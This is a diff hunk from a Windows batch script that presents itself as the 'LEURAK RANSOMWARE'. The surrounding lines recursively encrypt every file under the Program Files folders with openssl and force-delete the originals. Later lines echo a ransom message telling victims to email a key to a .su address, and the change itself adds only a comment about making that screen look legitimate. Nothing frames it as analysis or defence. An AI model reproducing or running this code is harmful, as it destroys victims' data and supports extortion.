@@ -39,7 +39,7 @@ cd "C:\Program Files"
 for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.leurak -k %randmaskey% && del /f %%i
 cd "C:\Program Files (x86)"
 for /r %%i in (*) do %openssl% aes-256-cbc -a -salt -in %%i -out %%i.leurak -k %randmaskey% && del /f %%i
-
+:: All this shit is needed to make the COM1 screen filled up so it looks legit.
 echo Oops! Your important files have been encrypted with the LEURAK RANSOMWARE! > COM1
 echo What can you do to get them back you ask? > COM1
 echo Just enter your personal identity key and send it to this email: januscybercrime@jannycybercrime.su > COM1
